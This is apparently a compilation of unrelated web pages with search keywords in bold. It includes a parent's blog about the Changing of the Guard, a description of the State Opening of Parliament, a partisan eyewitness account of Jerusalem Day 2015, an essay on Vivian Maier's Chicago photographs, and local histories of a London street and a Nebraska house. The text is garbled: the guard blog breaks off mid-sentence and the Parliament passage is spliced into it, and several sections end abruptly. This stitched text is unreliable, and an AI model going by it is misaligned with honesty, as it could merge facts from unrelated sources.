&#x201c;He&#x2019;s much too busy a-signing things,&#x201d; Says Alice.</p>   </blockquote>   <p>Fabulous for her, not so great for me, but luckily for Mama the coffee kiosks also sell ice cream. You might be thinking that half ten is a little early for ice cream, but it provided an excellent distraction for a good ten minutes, and then the clean up operation was also extensive. After that there was the fun of watching the police horses, in gloriously plentiful supply, who obligingly came and stood right in front of me on a number of occasions while their rider shouted instructions at the crowd. Mainly to do with keeping your valuables safe, I think. Mama was always going&#xa0; to be&#xa0; ok there &#x2013; she always keeps a tight hold of me in crowds.</p>   <p>And then the horseguards trotted past in full regalia! Was this it? Had the time come?</p>   <p>No. Apparently the were just going home after mounting the guard somewhere else.</p>   <p>After that highlight it was a bit of a long haul to the grand show.Every now and again a police horse would charge an errant pedestrian back behind the rope barriers. I started to get restless.</p>   <p>Finally, faintly, in the distance we heard a brass band playing. Louder and louder it got and closer and closer it came until the musicians hove into view, all bright red coats, shiny black boots and really really big furry hats.</p>   <p>And they marched straight into the entrance at completely the opposite side to where we were standing. We&#x2019;d caught an intriguing glimpse, but not much more.</p>   <p>At this point, Mama realised that perhaps she should have done a bit of rudimentary investigation into how the Changing of the Guards works, and whether or not it is worth turning up if you don&#x2019;t get there three hours ahead.</p>   <p>However, before guilt at being a monumentally bad hostess started to eat too much into her soul, a new band could be heard approaching. And this one swept past the first gate, past the middle gate and past us, with their big parpy trumpets, big booming drums, more big furry hats and big machine guns topped with bayonets, before diving into the final set of <b>gates</b>.</p>   <p>What happens next Mama cannot tell you, as it was audio only for our little tourist group. Some shouting, the occasional stamping and some kind of battle of the bands were what reached us. Mama began to regret not insisting on crushing people&#x2019;s toes in the pursuit of a good view, but I quite enjoyed balancing on the rope barrier like a civery slightly in 1953 for Queen Elizabeth II&#x2019;s coronation, lowering the arches and making it appear more feminine. It is typically only worn at the Coronation and the State Opening of Parliament. &#xa0;The Crown includes 2,868 diamonds, 273 pearls, 17 sapphires, 11 emeralds, and 5 rubies. Amongst these are:</p>   <ul>    <li>St Edward&#x2019;s Sapphire</li>    <li>a sapphire from the ring, or coronet, of Edward the Confessor</li>    <li>The Black Prince&#x2019;s Ruby (actually a spinel)</li>    <li>The Cullinan II (also known as the Lesser Star of Africa)</li>    <li>The Stuart Sapphire</li>    <li>Pearls worn by Queen Elizabeth I</li>   </ul>   <div>    <div>     |    </div>   </div>   <p>In recent years the Prince of Wales and Duchess of Cornwall have attended the State Opening of Parliament. They have traveled in a separate procession, following the royal regalia. Traveling in a State Coach, they arrive at the Sovereign&#x2019;s entrance, where they are greeted by the Earl Marshal and proceed to the Robing Room to await the Sovereign.</p>   <div>    <div>     |    </div>   </div>   <p>&#xa0;</p>   <p><span>The Arrival of the Sovereign</span> The Sovereign departs from Buckingham Palace in a State Coach accompanied by four divisions of the Sovereign&#x2019;s Escort, led by the Blues &amp; Royals and the Life Guards. In 2014, Her Majesty traveled in the new Diamond Jubilee State Coach which was used for the first time. In previous years she has often traveled in the Irish State Coach or Australian State Coach.</p>   <p>As the Queen&#x2019;s carriage approaches the Palace of Westminster, a military band places the national anthem, and the Royal Standard is raised to indicate the Sovereign&#x2019;s presence. Her carriage is followed by several other carriages, carrying her ladies-in-waiting and several other prominent members of the Royal Household. She is greeted at the Sovereign&#x2019;s entrance by the Lord Great Chamberlain and processes up the Norman staircase to the Robing Room. Here, she will put on the Imperial State Crown and Robe of State, as well as the Collar of the Order of the Garter. &#xa0;Upon her arrival, gun salutes are fired in Hyde Park and at the Tower of <b>London</b>.</p>   <div>    <div>     |    </div>   </div>   <p>&#xa0;</p>   <p>Finally, the doors open and the Queen emerges from the Robing Room, with a fanfare announcing her procession. She is now wearing the Imperial State Crown and her Robe of State, which is carried by four Pages of Honour. In addition, she is wearing the collar of the Order of the Garter, the most senior order of chivalry in the United Kingdom. The procession is led by the Officers of Arms and Heralds, then the Great Officers of State. The Queen, accompanied by the Duke of Edinburgh, is attended by four Pages of Honour who carry her train. Behind her are the Prince of Wales and Duchess of Cornwall, followed by the ladies-in-waiting and other members of the Royal Household. The procession goes the length of the Royal Gallery and through the Prince&#x2019;s Chamber, into the House of Lords.</p>   <div>    <div>     |    </div>   </div>   <p>&#xa0;</p>   <p>Upon arrival in the House of Lords, the Queen takes her seat on the throne, while her Pages of Honour arrange her Robe of State. At this point, she says &#x2018;My Lords, pray be seated&#x2019; and the entire chamber take their seats. The Duke of Edinburgh is seated immediately to her left, on a throne which is just slightly smaller than hers. The Prince of Wales and Duchess of Cornwall are seated in smaller chairs to the Queen&#x2019;s left. The Pages of Honour stand to the side of the Prince and Duchess, while the Queen&#x2019;s ladies-in-waiting stand on the opposite side of the dais.</p>   <div>    <div>     |    </div>   </div>   <p>&#xa0;</p>   <p><span>Royal Summons to the Commons</span> The signal is given to instruct The Gentleman Usher of the Black Rod to summon the members of the House of Commons. He proceeds through the central lobby, and upon arrival at the doors of the Commons, the door is slammed. This symbolizes the House of Commons&#x2019; independence from the Sovereign.</p>   <p>Black Rod bangs on the door three times, before it is opened for him. He proceeds into the Commons, acknowledging the members, and says &#x2018;Mr. Speaker&#x2026;Her Majesty The Queen commands this honourable house attends Her Majesty, immediately, in the House of Peers.&#x2019;</p>   <p>The members of the House of Commons then proceed to the House of Commons, led by Black Rod and the Speaker. They take their place, standing, at the bar at the far end of the House of Lords. At this point, the Lord Chancellor approaches the throne, and hands the Speech to The Queen. The speech, although called The Queen&#x2019;s Speech, is actually written by the government of the day, and lists the Government&#x2019;s plans for the current session of Parliament.</p>   <p>After The Queen has read the speech, she processes back out of the House of Lords, through the Prince&#x2019;s Chamber and Royal Gallery, and back into the Robing Room. Once she has removed the Imperial State Crown and Robe of State, she and the Duke of Edinburgh descend the Norman Staircase and return to their carriage for the procession back to Buckingham Palace.</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>  </div>  
rcus princess, and then some kids came and sat on the curb in front of us, so I joined them, made friends and got to play with Mama&#x2019;s camera.</p>   <p>Lots of bottoms in my world Mama discovered later.</p>   <p>Eventually, the Guards had done enough Changing. The middle <b>gates</b> opened and out marched the first group, executing a smart right as the did so and providing us with an excellent view of their retreating backs.</p>   <p>But we were wise to this behaviour now and hung on for the second wave, who, sure enough, turned the other way when they left and we got another splendid view.</p>   <p>The whole thing was over by about 12 noon.</p>   <blockquote>    <p>They&#x2019;re changing guard at Buckingham Palace &#x2013; Christopher Robin went down with Alice. &#x201c;Do you think the King knows all about me?&#x201d; &#x201c;Sure to, dear, but it&#x2019;s time for tea,&#x201d; Says Alice.</p>   </blockquote>   <p>Mama decided to reward my quite good behaviour with a trip to the children&#x2019;s play area in a well-placed nearby corner of St James&#x2019;s Park. It&#x2019;s one of those places which is split up into hidden zones. But there&#x2019;s an excellent little picnic island with a clear view of the one and only exit and the whole playground is fairly compact. And I am, after all, over three now and not quite so prone to hurling myself into dangerous situations as before. Overall, Mama feels that the layout is acceptable. As for the equipment, I think it has a great sandpit, full of really big, slippy and hard rocks to jump on and off. Mama sees Prince Philip&#x2019;s hand in this breach of health and safety rules for children. I also like the sunken slide area.</p>   <p>Basically, it&#x2019;s clear that if you are on the parade route, wherever you stand, the Changing of the Guard is organised so that at some point, soldiers will stamp past you. The closer to the central <b>gates</b> you are, the more you will see of both groups of soldiers, but to be honest, Mama thinks that if you just have a casual interest in seeing the ceremony, you might want to turn up fairly late on and just take your chances in the crowd.</p>   <p>Everybody is pretty obliging about letting children through to the front, and as long as you don&#x2019;t mind sitting on the curb, the odd Mama and Papa might be able to wiggle though too on the grounds that their kids might need protecting from flying police horse poo.</p>   <p>We also noticed that a couple of people with wheelchairs had been positioned by the police horses on the edge of the road in a pretty decent spot, so that&#x2019;s something to take into consideration if you have mobility requirements which might otherwise put you off going.</p>   <p>If you want to see the whole thing, Mama thinks you are looking at an arrival time of at least 10am. She thinks your children might need to be a bit older than me, or more stoic to put up with that.</p>   <p>Is it worth it? Take snacks, plenty of water, and lots of photos of the police horses and I&#x2019;d say so.

   <article>   <div>    <h1><span>Jerusalem Day: Palestinians met with extreme violence</span></h1>    <p> <span>in , , </span> <span>May 19, 2015</span></p>    <div>     <p><span>On Sunday 17th May 2015, I witnessed some of the most violent and painfully blatant acts of Apartheid since my time in Palestine. I went to Al Quds for the annual &#xb4;Jerusalem Day&#xb4;, to document the racist chants, commonly known to occur. &#x2018;Jerusalem Day&#x2019;, or &#x2018;Yom<span>&#xa0; </span>Yerushalayim&#x2019; is a zionist celebration of the 6 day war in &#x2019;67, when Israel claims to have reuinited Jerusalem. Having ethnically cleansed West Jerusalem in 1948, Israel has occupied East Jerusalem since &#x2019;67, which had previously been under Jordanian control. The day consists of thousands of hard line Israelis, many of them young men, marching with flags through the muslim quarter of the old city, chanting racist and abusive slogans such as &#x2018;Death to the Arabs&#x2019;, and forcing shops to close their doors for the day.</span></p>     <p><span>Naively, I expected a relatively uneventful day, videoing marchers as they passed through the street. In reality, the day consisted of an abusive demonstration of the Zionist apartheid state and the ethnic cleansing upon which it is founded.</span></p>     <p>We arrived at Damascus gate just after 2pm to a crowd of young Israelis waving Israeli flags and, closely watched by soldiers, a small group of Palestinians and internationals waving Palestinian flags. All seemed tense. Throughout the city were swarms of zionists, dancing, chanting and celebrating their deemed &#x2018;ownership&#x2019; of this city. Their loud chants through the Old City and choice to gather at Damascus Gate (The entrance to the muslim quarter), was a nod towards the provocative nature that this day would inevitably take.</p>     <p><span>Over the course of an hour, I witnessed a number of arrests. Although all separate to each other, they all had a common thread; they were all arrests of Palestinian men, and all included acts of violence shocking even within the context of the abusive occupation. I saw the first of these arrests only once the man&#x2019;s head was locked in the arms of two soldiers. I burrowed under the arms of the soldiers and pulled the man away, a group of us successfully dearresting him. As he ran, the soldiers grabbed him again, holding his arms behind his back and squeezing at his chest. The man collapsed. His body fell to the ground between the soldiers, and as people rushed forward to perform CPR, the soldiers pushed them back, not allowing them to reach him. Eventually the man was carried away to hospital. We heard no news as to how he was later in the day.</span></p>     <p>Pushed against some close by metal railings, another man was grabbed by around 6 soldiers and thrown to the ground, before being stamped on and kicked as he lay there handcuffed. Just below the same railings, an Israeli soldier throttled another Palestinian man. Whilst his two hands were round the mans neck, other soldiers swarmed in and pushed him to the ground, hitting him in the face. He too was taken off by paramedics. An older man who looked in his sixties, whose arrest I didn&#x2019;t see, was carried by his four limbs through the crowd by police.</p>     <p><span>These arrests were all at the entrance to Damascus Gate, watched over by a group of Zionists who were left to stay in the area. The agenda of the police and military at the scene, was to clear the area and road leading to it of any Palestinians. All Palestinians were moved to a side street, by police on horses charging through the crowds. Palestinians were pushed shoved and pulled away from the gate, many of whom had shopping bags and were with their children.</span></p>     <p><span>One elderly man passing through was thrown forwards onto his face by two soldiers. I next saw him as his bloody mouth was tended to by paramedics. Another was grabbed by a number of soldiers, and thrown with such force onto his back, he traveled a meter or so passed me before landing. A Palestinian man who attempted to stop a young zionist from pulling a scarf from a Palestinian woman, was pushed down the steps by two soldiers, as the zionist boy and his friends watched on. The woman, reclaimed her scarf and sat on the spot holding a Palestinian scarf in one hand, gesturing the peace sign with the other.</span></p>     <p><span>At around 7pm, what looked like tens of thousands of Zionists marched to Damascus Gate and on through the muslim quarter of the Old City. Largely consisting of young men, they chanted in Hebrew, directed at any Palestinian watching from the side. An older man next to me held a Palestinian flag, as the Zionists threw broken sticks from their flags at him. Later, standing among a small group of press at the side of the square, I found myself on the receiving end of sticks, as the crowd took any opportunity to attack onlookers. Press were hit with sticks, and dragged by police away from the gate. One police officer rugby tackled me from behind, as sticks were thrown from overhead. The crowd hurled abuse, as the soldiers watched on, many laughing along to the chants. As a Palestinian man nearby shouted back to the crowd, he was abruptly arrested and pulled away by soldiers.</span></p>     <p>&#xa0;</p>     <p>The scenes witnessed at Damascus Gate on Sunday were not however the full extent of the day. A family we later visited whose house has just been demolished in East Jerusalem, had their area surrounded by Israeli flags, with people chanting &#x2018;Death to the Arabs&#x2019; outside their window. Their 8 children, who were too afraid to leave the house, are daily witnesses to hatred inflicted towards themselves and their families.</p>     <p><span>Jerusalem Day to me was Zionism personified; the racist apartheid state that Israel is unashamed of. <span>&#xa0; </span>There were violent attacks on Palestinians by soldiers, police, and Zionist marchers alike. The soldiers and police supported Zionist youth as they hurled verbal abuse at passers by. Palestinian shops were forced to close as Zionists banged on their front shutters. Palestinians were made to move from the Muslim quarter to watch from afar as Zionists chanted hatred towards them &#x2013; inciting ethnic cleansing and death to the Arabs.</span></p>     <p>This day was not one of watching on the sidelines as a group marched through the street &#x2013; this day was a new awakening for me as to the systematic violence the Israeli state relies on. The city was turned into a playground for the new generation of right wing Zionists, as they were taught the abuse that&#x2019;s accepted against all those not waving the same flag.</p>    </div>    <span>2015-05-19</span>   </div>  </article>  
   <div>   <p><strong>The Architectural Photographs of Vivian Maier</strong></p>   <p>By FRANCES BRENT</p>   <div>    <p>Shot from outside an unidentified building, this photograph taken on June 27, 1964, is a double self- portrait of Vivian Maier (1926&#x2013; 2009), revealing her image reflected in a mirror inside and her shadow cast on the plate glass store front outside. The image demonstrates her fascination with the way new construction, also reflected on the glass, was grafted onto the old city.</p>   </div>   <p>SINCE SHE DIDN&#x2019;T DRIVE A CAR, the bicycle wheel signified independence for Vivian Maier during the years she lived in the suburbs of Chicago as a nanny and got around town on her bike. It also represented structural grace. You see this in what might be considered a self-portrait, Vivian&#x2019;s <em>Shadow on Bicycle Tire</em>, where her lens studies the design of spokes threading out from the axle and attaching onto a metal hoop. The pattern of the spokes plays above their shadow (as well as above Maier&#x2019;s own shadow) like an image from the constructivists Naum Gabo and Antoine Pevsner. Similarly, when she came upon a barrier fence battered down by a storm at the beach, she focused her camera on the splintered wood slats radiating around a hanger-like loop. From Maier&#x2019;s viewpoint, the accidental structure looked like the air-filled configuration of a miniature architectural model. </p>   <p>The framework of things interested Maier deeply, and she seemed particularly inquisitive about the mass-less mass of modern architecture. This is evident in the many photographs of Chicago&#x2019;s downtown she shot in the 1960s and early 1970s, when she would take the train into the city on her days off. The dynamic complexity must have relieved some of the restlessness she felt in the suburbs, where life was constricted and her observing eye was limited by the practical responsibilities of domestic work. Maier was new to he city; she had come from New York in 1956 when she was thirty years old. Like her mother and her grandmother before her, she did household work to earn a living. As she put it, she was sometimes a difficult person, private, closed off to strangers. When she went downtown, she suddenly merged into the powerful and constantly moving vitality of the city with its architecture in transition. The force of traffic, el trains, backhoes, jackhammers, and wrecking balls could be unbalancing, but shielded by the Rolleiflex strapped around her neck&#x2014;actually looking down into its viewfinder&#x2014;Maier was able to slow things down so the chaos was tolerable. She instinctively used the grid of the physical city, the angles of the streets, sidewalks, and massive buildings, old and new, to affix her compositions in space.</p>   <div>    <p>In this c. 1967&#x2013;1968 photo Maier focused her camera on the splintered wood slats of a battered beach barrier fence radiating around a hanger-like loop of wire.</p>   </div>   <p>In the same way that some artists have a genius for rendering figures in the off-kilter but truthful midway of movement, Maier repeatedly documented the transitory quality of the city as she found it. The Wrigley Building, Tribune Tower, the original Stone Container Building, the Old Water Tower, the Michigan Avenue Bridge, the sidewalks between Marshall Field&#x2019;s and the elaborately ornamented curved entrance to the Car- son&#x2019;s Building, the Art Institute and Grant Park behind it, the movie palaces&#x2014;State-Lake, Chicago, Woods, United Artists, Clark&#x2014;these were her touchstones, and they delineated a province she shared with sailors on leave, women with scarves tied under their chins or wearing corsages on fur coats, men in straw hats, men in trench coats, many of them impassive faces that had survived the years of depression and war.</p>   <div>    <p>Maier documented the architectural transitions of Chicago, including the Wrigley Building (photographed late 1960s)</p>   </div>   <p>From her contact sheets, one can infer a method of working as she moved photographically through sometimes large and random blocks of space, documenting Chicagoans in their architectural domain. Shooting what she saw as she roamed, she often caught the way the design and mass of Chicago&#x2019;s eclectic buildings were echoed by the shapes and configurations of the city&#x2019;s inhabitants. An elderly woman&#x2019;s egg- or dome- shaped hat, for instance, lines up humorously against the backdrop of the similarly shaped Tribune Tower and Wrigley&#x2019;s clock tower.</p>   <div>    <p>A signature composition is Maier&#x2019;s 1960 view of the intersection of Washington and South Wells Streets, anchored by the el station..</p>   </div>   <p>Some of the sites that interested her, such as the city&#x2019;s dark viaducts and building canyons, presented technical challenges for her Rolleiflex, but given the right lighting, a bright morning sky or just after sunset when streetlamps add a glow of illumination, she was able to manage. In one of her signature compositions, she chose an intersection at Washington and South Wells Street anchored by the el station. From her vantage point, facing a corner parking garage&#x2014;a boxy, brick, birdcage building typical of the pragmatic New Bauhaus&#x2014;she structured her composition with the eye of an engineer. Zeroing in on the physics of overlap- ping architectural structures, she showed how the stairs to the el, the fretwork of the railing, and the metal bracing of the platform formed a series of vectors, while the right angle of the garage, the sidewalk, and the street lines of the crosswalk formed an alternative group of radiating lines. Maier analyzed the intricate solid geometry, the design of a city corner, and then pounced at the moment when four pedestrians reinforced the structure, lining up imperfectly in the luminescent slush on the street.</p>   <div>    <p>Taken in 1971, this view down State Street shows the Chicago Theater on the right and Marina City in the distance.</p>   </div>   <p>Over the years, Maier seemed to take a proprietary interest in the development of downtown spaces and she made it a habit to photograph the new skyscrapers, sometimes surrounded by cranes and sidewalk sheds, as they went up. Her images of the Chase Tower, the Brunswick Building, the Sears Tower, and the John Han- cock Center look something like personal souvenirs and demonstrate the difficulties of finding a vantage point and dealing with the physical limitations of her camera and its fixed lens plane and parallel plane. Unless the film plane can be kept parallel with the face of the building the sides of the building (any vertical lines) will converge as the building rises above the cam- era. The cereal-box shaped Prudential Building, forty-one stories high and representing the most modern technologies of its time, was new when Maier arrived in Chicago. In a playful photograph, several years later, she caught its limestone and glass facade low of center in her viewfinder while shooting from behind the tail of one of the the Art Institute&#x2019;s lions.</p>   <p>During the 1960s the clean lines of new construction contrasted starkly with those of the old neoclassical and Beaux Arts buildings. After years of neglect, many of the landmark structures were covered with soot and had damaged masonry. Just as Maier documented the stoic and walled-off faces she noticed on the streets, she captured the architectural decay, destruction, and dismantling, an essential component of a modern city. Her photograph of the old Federal Building in the early stages of demolition is a study of a building&#x2019;s anatomy. With Ludwig Mies van der Rohe&#x2019;s new Dirksen Federal Building in the background, she took a long steady look where the edifice was skinned away, exposing opened up chambers that looked like a honeycomb.</p>   <div>    <p>Shot on June 27, 1964, this compelling composition shows the then Stone Container (now <b>London</b> Guarantee) Building, Marina City, and the Sun-Times Building (demolished in 2005).</p>   </div>   <p>Maier took many photographs at two of Chicago&#x2019;s most important 1960s building projects&#x2014; the Daley Center and Marina City. The design of the Daley Center (originally the Civic Center) was intended as an architectural homage to Mies van der Rohe and his International style that had so deeply influenced his adopted city. Simultaneously, city planners hoped to configure a European-style square by creating a large and open space north of the building site. The concept caught Maier&#x2019;s fancy and she shot a whole roll of film, sometime around 1970, looking at a matrix of city experience charted on coordinates of the plaza. In one corner she caught two hard-nosed attorneys exchanging views about a dispute spilling over from the courtroom; in another, pedestrians approaching a sidewalk shed in an urban parade. Maier then angled her camera back to photograph the monumental Picasso sculpture and the unfinished construction of an adjacent building. When she stepped even farther away, she caught a group of office workers and tourists playing a game with coins, rolling them across the granite tiles, bracketed by the heroic glass base of the Daley Center. Her photograph highlights the prismatic quality of the building, transparent enough to see right through to the long, low Greyhound sign on the other side.</p>   <p>The construction of Marina City with its two sixty-story apartment towers&#x2014;corncob towers, as Chicagoans refer to them&#x2014;signaled an audacious breakthrough in architectural imagination. Solid but spatially fluid, the cylindrical towers were a corporeal reminder of the laws and language of three-dimensional geometry. Like the bicycle wheel, the structure was perfect, kinetic, and complex. When you look at the photographs Maier took during different stages of construction and from various vantage points, you can sense the impatience she must have felt, navigating the multiple levels of the city with its unwieldy bridges and buildings. The towers were pure anomaly: built from concrete but organically shaped, vertically masculine but cerebral, wind resistant but serrated like leaves, mysterious as primeval standing stones while displaying brightly painted automobiles on cantilevering garage floors. One particularly compelling composition shows what was then the Stone Container Building, the Marina City towers, and the Sun-Times Building standing in a row like stepping stones. The image gets at the growing pains of proportionality, an awkwardly beautiful moment in Chicago&#x2019;s metamorphosis. While there was a sense of loneliness and isolation settling on the surface of the buildings that day&#x2014;something the photographer could contemplate knowingly&#x2014;the photographic lens showed Marina City bathed in a kind of smoky light that enhanced its abstract qualities. On the street, pedestrians, cars, a trailer, a trashcan, and a mailbox appeared becalmed and miniature in a space that they shared with a cluster of the city&#x2019;s monumental and sculptural structures. </p>  </div>  
   <div>   <h1>Regent&#x2019;s Canal : Limehouse to Islington</h1>   <div>    <p>This walk was actually completed in 2011, when it was one of a series of walks in an AA guide book. The walk actually starts&#xa0;slightly&#xa0;away from the Canal in Limehouse, but here I have extracted just the canal part of the route. I did not have my GPS unit switched on for the walk, so the plot in GoogleMaps was a pre-prepared route rather than the actual recording.</p>    <p>The can starts off as it enters the Limehouse basin, as can be seen in another canal walk (starting at Bow and going in a loop around Regent&#x2019;s Canal and the Hertford Union Canal).

   <div>   <p><em>(under construction &#x2013; please get in touch with John if you can supply any additions or corrections)</em></p>   <p>The street named Listria Park owes its unusual shape to the , now one of London&#x2019;s lost rivers, which at one time helped to define the northern boundary of the estate of (1640-1721), Lord Mayor of <b>London</b>.</p>   <p>Stoke Newington was at that time something of a centre of nonconformist Protestantism, and an even more celebrated resident of the Abney estate was (1674-1748), known nowadays as the father of the English hymn school, though he was also a prolific writer on theological subjects, with robust awaiting unrepentant sinners.</p>   <p>Pictured left, as it is today, is Dr. Watts Mount (or Mound), which then stood beside (or as some allege, on a tiny island in the middle of) the Hackney Brook.&#xa0; It was reputedly his favourite site of contemplation, and a stone tablet erected there in his memory by his admirers still adorns it.&#xa0; The mound is within a few feet of what today is No. 1 Listria Park.&#xa0; The Abney estate&#x2019;s boundary remained unchanged when, in 1840, it became .&#xa0; Some of the exotic trees planted at that time still remain, but nature has largely taken over.&#xa0; Today Abney Park&#x2019;s densely wooded 32 acres of wildlife preserve constitute the view from the back of houses on the west and south sides of Listria Park.</p>   <p>By 1860, thanks to the mid-Victorian population explosion, the Hackney Brook had become an open sewer.&#xa0; Responding to the &#x2018;&#x2018; of 1858, the Metropolitan Board of Works consigned it underground as part of the sewage system designed by &#xa0; Today (says Wikipedia) the Brook is untraceable, having become lost in the labyrinth of sewers as they developed.&#xa0; This photo from the Hackney Archives shows the building of the sewer, which carried effluent from as far away as Highgate and delivered it to the main sewerage system at Old Ford.&#xa0; (click on the image to enlarge)</p>   <p>An Ordnance Survey map of 1864 shows what appears to be a formally planted garden in the area now occupied by Listria Park and Martaban Road.</p>   <p>This section of the map shows Dr. Watts Mound at the top left-hand corner, with the edge of what was by then Abney Park Cemetery (1840) running down the left-hand side of the map.&#xa0; The cemetery&#x2019;s wall (today lying at the bottoms of Listria Park back gardens) runs south, to the right of a line of trees.&#xa0; Manor Road passes diagonally across the top right-hand corner, while towards the bottom of the map what is now Martaban Road is shown as a tree-lined path running west to east, with non-rectangular buildings on its north side suggestive of ancient property boundaries.&#xa0; (click on image to enlarge)</p>   <p>The next detailed Ordnance Survey map dates from 1894-6, and shows the Listraban area laid out as streets, with vacant plots at Nos. 61, 63, 125 and 127 Listria Park, possibly because of unstable, sandy subsoil resulting from the course of long-forgotten waterways.&#xa0; In the 1990s soaring property values led to the underpinning and development of all four sites, with the addition of the present 137 Listria Park.&#xa0; A double-fronted house at 44 Listria Park, shown in the 1894 map, disappeared at some point after 1937, and the resulting gap was only refilled in the late 20th century.</p>   <p>One curiosity today is No. 23 Martaban Road, whose facade is somewhat suggestive of a chapel, but if so it does not date from the Victorian high tide in church- and chapel-building, for the site is shown as vacant in the 1896 map.&#xa0; The frontage features a stone carving of a ram&#x2019;s head, and the fact that the ram is a Biblical symbol for Christ may be a further clue to the building&#x2019;s original function.&#xa0; Before its recent conversion into flats it was used as a dressmaking workshop.</p>   <p>25 Martaban Road was also a vacant site in 1896, but by 1937 the plot was filled with a utilitarian red brick light industrial building.&#xa0; Its upper floor was later to be occupied by the Hackney Pakistani Women&#x2019;s Welfare Centre, a voluntary organisation run by a Listria Park family named Qureishi.&#xa0; Among other things it taught employment skills and dispensed health advice and a weekly lunch for the elderly.&#xa0; Around the turn of the century, following a fire in the ground floor warehouse, the building was converted into the present flats.&#xa0; In both this case and that of 61 and 63 Listria Park, developers had to overcome reluctance by planners to grant change of use, for in Hackney, not the most economically thriving of boroughs, the loss of land supporting employment is resisted.</p>   <p>Unlike the stately villas that by the mid-19th century lined Stamford Hill (homes to affluent bankers escaping the unsalubrious air of the City), the newly-constructed Listria Park and Martaban Road offered more modest dwellings to the capital&#x2019;s burgeoning work force.&#xa0; From contrasts in style and size it is clear that the streets were divided into parcels leased to different speculative builders, with the grandest at the north-east wing of Listria Park and the most modest on the southern stretch.&#xa0; In many houses the original decorative cornices and fireplaces have survived.</p>   <p>An indication of the social character of the first generation of occupiers comes from the census of 1901 &#x2026; <em>(to be researched)</em></p>   <p>Like an old soldier, Listraban today shows the honourable scars of war wounds.&#xa0; At a few front <b>gates</b> the observant eye will notice small rectangles of <b>iron</b> in the ground, surrounded by lead.&#xa0; Those are the vestiges of the original cast <b>iron</b> <b>railings</b>, torched down during the Second World War to make munitions.&#xa0; Nearby Summerfield Road, off Church Street, whose <b>railings</b> somehow survived, gives an idea of what Listraban would have looked like before 1939.</p>   <p>Another testimony to the war is the slightly hazy view from some of Listria Park&#x2019;s back windows.&#xa0; A bomb is said to have fallen in Abney Park, and the roughly-surfaced wartime glass that replaced blown-out windows still survives in some homes.</p>   <p>In the 20th century the 61-63 Listria Park site was at times the focus of controversy.&#xa0; It had been occupied by&#xa0; the Jeakins family, resident in Listria Park, who ran a removals business and used the plot, laid to concrete, as a park and maintenance site for their lorries.&#xa0; This was not universally popular, and oral tradition has it that abortive schemes were hatched to undermine it by such measures as having the road made one-way, which, given the sharp south-east corner, would have made the manoeuvring of lorries difficult at times.&#xa0; (That point was well demonstrated when police diverting traffic unwisely directed a 106 bus into Listria Park).&#xa0; In fact the marshalling of lorries carried on until Danny Jeakins acquired ownership of the site and planning permission for the houses that now stand there.</p>   <p>The character of Listraban had meanwhile undergone a significant change following the 1974 Housing Act, which empowered local governments to set up &#x2018;Housing Action Areas&#x2019; with a view to improving housing quality.&#xa0; This led to the appearance of cobbled promontories built out from the pavements, some of them with tree pits, others carrying large containers for decorative plants.&#xa0; These features contribute greatly to the special atmosphere of Listraban.</p>   <p>The present Community Association eventually took over responsibility for maintenance of the containers.&#xa0; At one stage there were even fantasies of temporarily exploiting the then vacant sites as communal gardens, but the practical obstacles were too formidable.</p>   <p>&#xa0;</p>  </div>

   <div>   <p>The Kaley House at 909 North Seward Street in Red Cloud, Nebraska is owned by Jay Yost and Wade Leak of New York City. They purchased the home in 1996 from Jay&#x2019;s childhood babysitter, and have been working since then to restore it. Jay was born and raised in Red Cloud, and Wade is from Morgan, Utah (Porterville, to be exact). The home has become a part-time bed and breakfast, and a home-away-from-home for Jay and Wade.</p>   <p>The Kaley House was built in 1885-1886 by Charles William Kaley and Cyrelia Arella (Widney) Kaley &#x2013; 14 years after the founding of the town. The home is an important part of Red Cloud&#x2019;s <i>Seward Street Historic District</i> which, according to the Nebraska State Historical Society&#x2019;s documentation, is a well preserved residential section that includes most of the finest homes built in the village in the late nineteenth and early twentieth centuries. This historic district, like the three others included in the &#x201c;<i>Cather Thematic Group</i>,&#x201d; was identified as a historically significant area through Cather&#x2019;s literature and is defined by the abundance of significant Cather-related sites and Cather-era sites on the map.</p>   <p>The Kaley home was described in the State Historical Society&#x2019;s survey as, &#x201c;frame; irregular &#x2018;cross&#x2019; shape; two stories; gable roof with a hipped section; gabled front with projecting gabled entrance pavilion, wrap-around porch with Eastlake columns, square bay on side with iron cresting, imbricate gables with semi-luminate attic lights, carriage house at rear; vernacular Queen Anne style; c. 1888.&#x201d;&#xa0; (There is a copy of the National Register Survey in the writing desk in the Fireplace Parlor, along with a walking tour of the northern part of the <i>Seward Street Historic District</i>.&#xa0; Please feel free to borrow them.)</p>   <p>Charles Kaley was born in Mifflin County, Pennsylvania in December 1846, moved to Ohio at the age of seven, later attended Wittenberg College and then taught school for four years. In 1874, he settled in Red Cloud, three years after the town&#x2019;s founding. He was an early Red Cloud school teacher (1874 and 1875), and studied law under his brother, Henry S. Kaley, who had already established an extensive law practice throughout southwestern Nebraska. Charles was admitted to the bar in 1876 and practiced law with the firm of Kaley Bros., who were said to be the leading business lawyers of the Republican River Valley.</p>   <p>Prior to his death in 1881 at the age of 38, Henry had been appointed by President James Garfield to be Consul to Chemnitz, Germany. Unfortunately, he died of &#x201c;inflammatory rheumatism&#x201d; while making preparations to move.&#xa0; After his death, another brother, J.L. Kaley, joined Charles in the Kaley Bros. firm until 1887, when J.L. moved to Omaha. Charles continued to practice until 1896, when he sold much of his legal library and concentrated on managing his &#x201c;large and widespread&#x201d; real estate investments. One account noted that early on Charles had purchased 640 acres from the railroad for 25 cents an acre, and eventually owned over 3,000 acres in Webster County. Charles served for many years a local representative of the Burlington Railroad land office until their real-estate interests were disposed of. According to the family, it was through his railroad connections that Charles had the home&#x2019;s sidewalks of red Colorado flagstone shipped to Red Cloud.</p>   <p>He became a county judge in 1879, the same year that Charles and Cyrelia were married on Christmas Day. Cyrelia was born in 1858 in Auburn, Indiana, and was 12 years younger than her husband. He was appointed to the State Legislature in 1881, and was later elected in 1904.&#xa0;From 1881 to 1903 he was a member of the State Board of Education, and a Regent of the University of Nebraska from 1894 to 1898. He retired from the law in 1896 and was later appointed as a member of Nebraska Governor John Mickey&#x2019;s official staff, assuming the title of Colonel. (Mickey served two terms, from 1903-1907.)</p>   <p>Until they built this home, it is thought that the Kaleys lived in the smaller house still setting just to the west. The Kaley House, along with the Hugh Miner home (the &#x201c;Harling House&#x201d; in Cather&#x2019;s novel, <i>My Antonia</i>) on the southwest corner of West Third Avenue and North Seward Street (six blocks south of this house), were featured in promotional fliers distributed back East as examples of the fine homes already built in Red Cloud. (Reproductions of the fliers are available at the Willa Cather Foundation 